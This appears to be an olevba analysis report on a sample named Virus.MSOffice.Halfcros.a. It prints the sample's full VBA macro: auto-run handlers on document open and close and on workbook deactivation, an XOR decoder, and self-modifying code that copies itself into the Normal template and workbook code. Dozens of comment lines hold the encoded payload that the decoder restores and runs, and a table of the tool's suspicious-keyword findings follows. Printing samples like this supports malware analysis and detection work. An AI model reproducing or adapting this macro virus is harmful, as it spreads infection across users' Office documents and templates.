olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Halfcros.a-5da79bb007a95df49328e6853dad862e19b99f29
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Halfcros.a-5da79bb007a95df49328e6853dad862e19b99f29 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








































' 2
'ThisDocumentA
Private Sub Workbook_Deactivate()
If ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(40, 1) <> "'InRun" Then Call Calculate_AddressX(98, 25)
End Sub
Private Sub Document_Open()
Call Calculate_Address(83, 15)
End Sub
Private Sub Document_Close()
Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule
With Iam: .ReplaceLine 40, "": Z = .CountOfLines: Done = Decode(.Lines(73, 10), 230): .InsertLines Z, Done: Mail_Item: .DeleteLines Z, 10: .ReplaceLine Z, "End Sub": End With
Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule: Comp2 = Iam.Lines(41, 1): NormalTemplate.Saved = True:
CH = Word.ActiveDocument.Characters.Count: Comp = "'" + Str(CH): t = Iam.Lines(42, 1): If t = "" Then Exit Sub
If Comp = Comp2 And t <> "'ThisDocumentA" Then Iam.ReplaceLine 42, "'ThisDocument" & Right$(t, 1): ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument: Exit Sub
If Comp = Comp2 And t = "'ThisDocumentA" Then ActiveDocument.Saved = True: Exit Sub Else: If t <> "'ThisDocumentA" Then Iam.ReplaceLine 42, "'ThisDocument" & t
End Sub
Private Function Calculate_AddressX(Start_Encode As Integer, Code_Lines As Integer)
Set Work_Book = ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule
With Work_Book: Z = .CountOfLines: Done = Decode(.Lines(Start_Encode, Code_Lines), 230): .InsertLines Z, Done: Mail_Item: .DeleteLines Z, Code_Lines: .ReplaceLine Z, "End Sub": End With
End Function
Private Function Calculate_Address(Start_Encode As Integer, Code_Lines As Integer)
On Error Resume Next: CH = Word.ActiveDocument.Characters.Count: Comp = "'" + Str(CH)
WhereAmI = Right$(NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(42, 1), 1)
If WhereAmI = "N" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Iam: Z = .CountOfLines: Done = Decode(.Lines(Start_Encode, Code_Lines), 230): .InsertLines Z, Done: Mail_Item: .DeleteLines Z, Code_Lines: .ReplaceLine Z, "End Sub": End With: NormalTemplate.Save
ActiveDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 41, Comp: End Function
Private Function Decode(s, k As Integer)
Dim r: r = "": For F = 1 To Len(s): A = (Mid$(s, F, 1)): If A = Chr(13) Or A = Chr(10) Then r = r + A: GoTo Over
If A = "'" Then A = "": r = r + A: GoTo Over
r = r + Chr((Asc(Mid$(s, F, 1))) Xor k): k = k + 2: If k = 250 Then k = 230
Over: Next F: Decode = r
End Function
'©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒÜÈ¹‰šÐŠ˜·ˆ–È×Ì­‚—•‚�©Š€‰�„ÚÖ³€…�†Â¯€‚˜Ÿ›‡œƒƒ€ÒÛ
'½�Ø³«‹Ÿ‹Ø¶�„Ðž„«œžÞ³„†”�‹‹˜‡ŸœÚ¥Œ‡šž™ž “€žØÍÈÈ°¬Ÿ�ŸÇÖÄÁÃÌÒÎÒ¡µ™•�ÂÎ¬¿½¿ÇÚÏÈ¾„‹ž
'¡�…Œƒ…Ä¼œ™„•‚�¶š…Š‡œ—§‚Š�†�ÄÌÒÞÔÔ°­­³³­¥ ¦³¶²·¿¿«¢®§™ž’Ÿ‹ž‹¬¿�•Š‰›…Šš¬½’�‘…�¶ÔÀÀ®±Ž›ƒ„¶¡‡“€›…—€œÊ©–“—˜ÔÔÆÊ¥œš™�š…ÎÄÁÊÑÎÒÐ
'§�‹’�‡Â¾‚›‚—Œƒ¸˜ƒˆ™ž‘¥Œ”�„‹ÆÒÐØÖÚ®£¯µ±¼½··´¹¥«¯¦¹¼±ª«‰Žž›�‚—¨»‘…š…Ÿ�–†¨¹ž€�‰‰²ÈÜÄª¶ƒŸÊ¹�•€Ô¥�’œƒ‚‰ƒ®±Ž›ƒ„¶¡‡“€›…—€œÊ©–“—˜ÔÔÆÊ¥œš™�š…ÎÄÁÊÑÎÒÐ
'Œš¹–˜Ä»�‚™–™—�›Ä­Š”Ü§—Žƒ©™Ì–œ³„†Ö§˜š€‡““€Ÿ—ˆÆ¹˜�‚†�†¨‡œ‚ÌÈÐÐ¨´—‰ƒÛÂÌ
'£—€Ö±‡…ÊÑÎ¾�†›™Š¼��žœ“€“Ö°ªºž�š——‚Ö°ª©ƒƒ€�š“–’›ÂÝÇÞ±›’�«‡Ž™‚•ÈÔ¥�’È¯”�•žÔËØž„«œžÞ¥›„“„‡…‡�ØÐ¶™—�ÙÄÎÇÞ¤¶¦Š‰‚��šÞ¤¶µ—‹˜…‚‹ž†‡Ø±’�‡ÄÌ¤š�…¯‰š�Ž�Ÿ™ÖßÖ¥‡Ž‰£Ÿ–�š�
'±�ž„ÎµŠ—“”ÜÈ¼…œ³��“ØÛÈ£�ƒÞ¾�˜�•ÀÛÀÎ¹“™Ø»‰�„˜¡–¾�˜�•ÈÇÌßÀÛÎÖÖ¯†™‰œ„¾�˜�•ÈÛÀÎ¦›†µ—‚�ÐÌÀ¢—„š™…�†…€•ÒÜ¿™‹Æ©ƒ›ž†»�´�†�ŸÎÝÒÅÆÑÊÈÈ©€”Ò§ƒšÄÒÊ©€”Ò£ŸŒŽ
'�†­ž€Ü£™Š�Š…ƒ…ƒÚÖ´—‰ƒÛÂÌÙÜ·š—•�Ê¿�†—·ž™ˆ��ŸÔÍ¦†ƒ�
'ž„«œžÞ³„†”�‹‹˜‡ŸœÚ§��œ
'¯‚ŠÐ»’
'©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒÜÈ¥œš™�š…Öµ‰œ‰ Ÿ€™—”¶š…�ž„ÒÉÖ¾‡„™‰ÔÐ½„‚‘‰†™Â¸™€�…¨”‡ž‰�„››˜ØÛÈ¬�‚ƒ—
'§“ŒÆ©‰˜­‘€†Ÿ�”È×Ì¯“†�€�¢‡‰™ƒ•œ€Ø®¤¸˜ƒ„•‘€Ø®¤«…�žŸœ‘˜Œ•ÀÛÅÀ³��“µ‰ŒŸ€‹ÊÒ½�Ø®‡ŸžÆ¾�ƒßØÛÈÛÞÎ±œ�Öµ�†Ÿ˜‹Ø¼›�ÑÆÖÊÝÞÐ³š’Ø«�„™š•Úº™�ÏÈÖÌÜÅÒ ž�ˆÈ§Ÿ‰²�ŒÖÚ¯œ™Ìš™Ÿ‘Öž‰šÊ€›ž‘œÖÚÆÎÊ­ž€ž�•™’�…‚À¥�‘„¶‡…�ÀÎÀÞÔÔ¯‰†Ž‰œÐ„ÆØÈÆŠ“Ìº˜·Ô�½�ºŽÌ©•¼�£‹Ä
'»�˜Î¾�†›»‡š˜…‹‚ÒÉÖ¶‰š‡�‚¤—™†”‡œ�Â¸²¢†™’ƒ‹žÂ¸²±››ˆ‰†�‚šƒÚÅßÖ¥‡Ž‰£Ÿ–�š�
'¨¡ÊÑÎ¾�†›™Š¼��žœ“€“Ö°ªºž�š——‚Ö°ª©ƒƒ€�š“–’›ÂÝÇÞ±›’�«‡Ž™‚•Ü¸Ÿ–ƒ›ÂØÜÜÒÅß
'¹¯È×Ì¯“†�€�¢‡‰™ƒ•œ€Ø®¤¸˜ƒ„•‘€Ø®¤«…�žŸœ‘˜Œ•ÀÛÅÀ³��“µ‰ŒŸ€‹Þ¾�˜�•ÀÞÞÂÐÃÝ
'¿žÆºƒ‹†„ÖÜ¸±ÊÈÓÅÎÍÒÖ²—…�‡‰€„¼ÖÖ¬Ž�„Ì Ÿ€™¿–•œ‹€‚•–ÔËØ²šŸ‰Îµž‡“Ø¨‡˜�§ž�€—”Š�ŽÌÓÐ´•š‹ƒ
'¡ŒÌ¼™•œ‚ÜÎ¦£ÀÎÉÛÔÊÆÆÊ®ƒ�…Ÿ‘˜Œ¨ÊÊ­€”Òº™Š‹«‹žœ™—†Ø»‰�„˜¡–¾�˜�•ÈÖÒÎÀÒ ž�ˆÈ¯”‡„Ò§ƒš
'¯ŽÊ¾‡—š€ÒÐ§¡ÆÌ×ÙÒÉÖÚ¢‡‰™ƒ•œ€·ÚÆ¼‚‰€Ð³—‚±ˆ›ž�‚œ—�ÖÅÆ¼˜™‹Ð·˜…�Æ©‰˜§ž�€—”Š�ŽÌÓÐ´•š‹ƒ
'¡ŒÌ¼™•œ‚ÜÎ©£ÀÎÉÛÔÊÆÆÊ®ƒ�…Ÿ‘˜Œ§ÊÊ­€”Òµ•Œ¥‰˜ž‡•€Úµ—“†ž£ˆ¼›š“‹ÆÔÔÌÞÐ¦œ“–Æ­’…šÐ¡�”
'±€È¤ƒœ�»š…Œ‡„†‰ŠÐÏÔ¢Š“�Ê­€”Òµ•Œ¯†™˜�œž‘’ØÛÈ¾ž›•Ò ž�ˆÈ¯”‡„Ò§ƒš
'¯ŽÊ¢�‚Ÿ½˜‹’‰†€‹”ÒÉÖ¾‡„™‰Î¤š‘˜ÂÆ»�˜Î¹œ’“›’�…‚ÎÍÒº™Š‹«‹žœ™—†ÌØµ�žÌ­‘€†Ÿ�”È×Ì¯“†·—Š”��žÔÐ·˜…�ÜÈ¹‰šÐ»š��…œƒƒ€ÐÏÔ·›’«‹žœ™—†ÌØµ�žÌ­‘€†Ÿ�”È×Ì Ÿ€™µ™”šƒ‰œ
'§›€žØ¥‰˜ž‡•€ÎÖ¢ÆÕÊÄÀ³��˜Œ©Ž¦…€•�ÔÛØ×ÝÃÖÎ¦›†µ—‚�ÊÑÎÞ¾�˜�•ÀÛÀÎªÛÎÖ½ˆŒÊ»‡„šÎÖ¹ÆÕÊ¶ÎÝÒÅÃ
'¯�œ‚Ì§ž”‘•Œ�‡„ÖÎÞ»š…�”œ¦…€•�ÔÇÔÆ¾ƒž­Ÿ–‘ÌØÈº�œ‚‘‘‘º‘ˆ�Ê¶ÂÐÐ±˜œÆ»ŸŽÌ
'¹”Ô¸—”…£‚�„“˜š�‚È×Ì¨‘ž‡“Ø²€�‚ÎÞ ‘†”‡‹� ‡ž—ÔÂÊÊÈ©„œØÁÍßØÍÈÈ¸†™�°™›“…�‚š¾ÐÔ³”•�ÐÌÀ¢—„š™…�¦…€•ÒÀÄÔÆ«‚žÆÃËÝÖÓÆÊ«Î
'«ž–Ô¡‘’€
'©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒ
'µ�žÌ«¨ÒÉÖ¬Ž�™»�‚™–™—�Æ¼®¾‚�ž“›’Æ¼®­ŸŸ„™–ƒ†žŸÀ¹†‘›ÐÄ¼‚…�§�†�š‰‡�ÎÇÞ±›’�«‡Ž™‚•
'»’Ö­¥‰™‰Æ´›†Þ¹–˜†…�‘†�™–È»ž�œ„‡„¦™’€ÊÇÎÒ®¶™—�ÙÄÎÇÙÒÈÈØÄª¥£¥ÁÐÔ·–‚È¸…‰˜†ÐÞ½¾Æ¦…€•�ÜÂÈÊÈÛÅÂÐÇÝÖÄØÈÈ¥€¢‡šÔØ²€�‚
'«¨Ü¦“ˆŠ‰‰‰¢™œ‘ÖÌÖÄÊ¯†‚ÚÇÏÑÆÃÊÎ§ž �˜ÚÜÈ¹‰šÐ¥›„œ©Š€ÌÓÐµ‘‚·„‚��šØÞÔÔ¯‰šŽÂ¯€‚˜Ÿ›‡œƒƒ€ÒÛÎÖ±€È½ƒœ”½–œØÚÖÊÎÌÐ¦œ“–Æ¯…¸�Ð£�ŸŒ¹¼‚…�
'£—€Ö¯‰šŽ£ŒšÒÉÖ»”�‹˜‹¿�ž“›’ÀÈ»�‚–Ú·ˆ–„ƒ��„››˜ÚÏÒÊ¿‹„Òº¢ØÛÈ½ƒœ”½–œÖ¨‡˜��œ¦‘›ˆŠ‰ž‰À¦°¤„—Œ�‰˜À¦°·™•–‡„‰€„�ÜÔ¬Ž�™¨�“‡™“–’ÊÃÂ­Ÿ–‘»—‚�†‰
'§–Ò¦ŸŸŽœÎÄ ¤Ü¸Ÿ–ƒ›ÂØÜÜÒÅßÔÆÙÙÅÎÌÌÔÔ¬Ž�™¨�“‡™“–’¦ÈÌº˜—š
'¡—”Œ¥Ž„Þ½„‚‘‰†™Â½‘„‘¸—”…‹€¾‚�™†ŒÆÕÊª�œ�‘Ì
'¶²Æ®‰‚•†‘º‘ˆ�™ÌßÜÒº¢Ö¥‡Ÿ‚š¿”˜Ÿ–ƒ›ÐÌ ¤Ü½˜‹ƒšž ‡ž—‡ÖÉÊÈÈ¼›’ž�•Øµ�ˆÌª™�•””ƒ©¼ÄÇÒÈÔ¸¬È¡„Ÿ‹‚†¸Ÿ–ƒ›ÊÞÂÐÐ»†Œ�‡„ŸÀ¦›†ƒ‹¶š…˜‹“†�™–ÆÕÊª�œ�‘ÌÚÜ
'¦¾Â§ž�‘„Œª�„‰�ÐÁØÖÚµ‘™˜‹�Ü¤„‘�‰ž‰¾‚�’Ÿ”ƒ»žž‡ž•ÜÔÚÄÊÆÌÌÒº¿³¡¹«¿¾¼µ¼ ©­µ­¸°½Ÿ”€�™”�¶¡‡“€›…—€œ¶£ˆ–›—“¤ÞÆÚ°«ˆ‘‘š¤«�‰ž�ƒ�’‚Ø£�‰‰‚ÒÐØÖÚÄ§š˜‡Ÿœ‡ÀÚÄÁÊÑÎÒÐÖÔÚ
'¨¼Ä¥€ƒ—†‚´�†�ŸÎÄÞÔÔ«Ÿ›ž‰ƒÞ¢†ŸŽ‡œ�¼œŸ”�š�µœ˜…€—ÚÖÔÚÄÄÊÎÌ¸¹±¯§ª§©­¢¯¿µµ°¯¦¯°½Ÿ”€�™”�¶¡‡“€›…—€œ¶£ˆ–›—“¤ÞÆÚ° •…Ô£‹ƒšÊ¿‹„†�˜Ÿ•´¯”�•ž¨»‘…š…Ÿ�–†Ô³€…�†ÎÌÜÒÖÔ·–œƒƒ€ƒÄÖÔÑÆÕÊÎÌÒÐÖ
'¸¬È¡„Ÿ‹‚†¸Ÿ–ƒ›ÊÙÂÐÐ±˜œÆ»ŸŽÌÊÒ£™Š‚§ˆ†À¢‡šÖÚ¨‡˜��œÜ ž‘•¬…�›�—š‚Ö¢�™�Œœ—µ ÚÜ
'¦¾Âª•ž‘‚�ª�„‰�ÐÃØÖ¶²Æ©ƒ›ž†»�”�†�Ÿ
'¸™€·™œƒÈ×Ì«¨Ü¸Ÿ–ƒ›ÂÝÂÐ·¬Ø»‰�„˜¡–ž�˜�•ÈÇÌÜÅÛÎÖ¶²Æ£‚�•€€º‘ˆ�™ÌßÜÒ¢ŸŠ¥‡Ž‰Ô
'¾¦Ú¤�–„‹�‹¼›š“ØÎ¦¾Â­Ÿ‡š‚·€„ƒ‚‹ƒÛØÖÚ£†ŽÌ½…�ÖÌØµ�žÌ ¤ÒÉÖ¶‰œ‚…€—È
'£™Š�Š…ƒ…ƒÜµ’œÈ»‹š‹±�Ô°‘Š�¤�ƒ•ÈÉ·ˆ–„ƒ��„››˜Öµœ‹žš…‚¤—ŒŽÈÌÌÌ¬°›™“×ÆÈÀÎ¶›˜“¾‰š‡�šÊÏŒš¶‰š‡�‚ÜÒµ’œ²‡§ž›ÊÏ²—”•�
'¹‰šÐ³£ÖÅÆ¼‚…�§�†�š‰‡�Â¸²¢†™’ƒ‹žÂ¸²±››ˆ‰†�‚šƒÜ½‚�‹ÀÈ¸†™�£™Š�Š…ƒ…ÒÛÚµ—‚�§ƒŠ…ž‘
'¥�’È£»ÎÍÒ£™Š�Š…ƒ…ƒÚÖ´—‰ƒÛÂÌÙÜ¢´¨”‡€‰�„Ü¢´»‰…šƒ€•œ€…Ö¯œ��ÆÒ¦œŸ‹±‡˜‡ŒŸ�ŸÔÑÈ«…ˆ‹½��ƒ”ƒ
'¡ŒÌ¼™•œ‚ÜÎ¡½Â¢™œ‘…ÐÒÚÆÌßÙÞÔÇËÏÈÖÒÎÒ¦œŸ‹¢‡‰™ƒ•œ€¸ÚÆ¼‚‰€Ð¤�„»‰Œ�ÌÓÐ³£Ø´�†�ŸÆÁÞÔ·¯È«…™€„½’š‘ˆ�™ÌÃÐÀÁßÂÆ¡½Â§ž�‘„Œª�„‰�ÐÃØÖ®�š©ƒŠ•ÈÔ¿¯Èº�œ‚‘‘‘º‘ˆ�Ê¥¹Þ±›ƒ–’§Œ€‡ž—‡ÚØÄ­„ˆÎ£‡–ÔÂÆ¡½Â¼•‚˜—›ƒ¤ƒ‚‹ÐÆÄÚØÄÊ
'½ƒœ›�›™“•ÀÈ®�Ÿ™ÅØÚÏÆ©€�ƒ—Ô¥™��©„�ž•‘…ÂÛ¼˜™‹
'µœ�Ö±€ÒÊ»�‚–»”’È¹Ÿ…šÊ
'£�ŸŒ¹¼‚…�Ê
'·š’Ø¯ŽÐÌ½•†Ô·¯ÆÕÊ¸†™�£™Š�Š…ƒ…Þ¤¶¦Š‰‚��šÞ¤¶µ—‹˜…‚‹ž†‡Ø±’�‡ÄÌ¤š�…¯‰š�Ž�Ÿ™ÖßÖ¥‡Ž‰£Ÿ–�š�ÜÈ¬ƒœÐ›ÔËØ×È¾ƒÎ§�†�š‰‡�ŸÀ³��˜Œ
'µ�žÌ§§ÒÉÖ¯‰š�Ž�Ÿ™‡Þ‘ÏÆ¼®¾‚�ž“›’Æ¼®­ŸŸ„™–ƒ†žŸÀ¹†‘›ÐÄ¼‚…�§�†�š‰‡�ÎÇÞ±›’�«‡Ž™‚•
'»’Öª��‚˜ÊØ»£Ø´�†�ŸÆÄÀØÖÉÏÄÊÝÝÙÒÈÈØÄ¼‚…�´�—ƒ•ƒ†ž¢ÌÐ¦œ“–Æ¾ƒž­Ÿ–‘ÖÅÆ©½Â¢™œ‘…Ð×ÄÊ­¹Þ±›ƒ–’§Œ€‡ž—‡ÖÕÆÚßÅÔÐ»£Ø±ˆ›�žš¼›š“‹ÆÙÆÌ¸™€·™œƒÒÊ¥¹Þ ‘†”‡‹� ‡ž—Ô¿¯È«…™€„½’š‘ˆ�™ÀÎÒ·š’Øµ�ˆÎÔÐ»£Øªƒ˜†��•¾�˜�ÆÜÚÀÎÒÐ
'º“€’ÒÊ­¹Þ ‘†”‡‹� ‡ž—ÔÂÈÊÈ©„œØÁÍßÂÆ¿…ž…’�›�‹ÎÊ¨ƒ�›ÃÖßÖµ‰œ‰ŠÐÏÔ¢Š“�
Private Sub Mail_Item()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

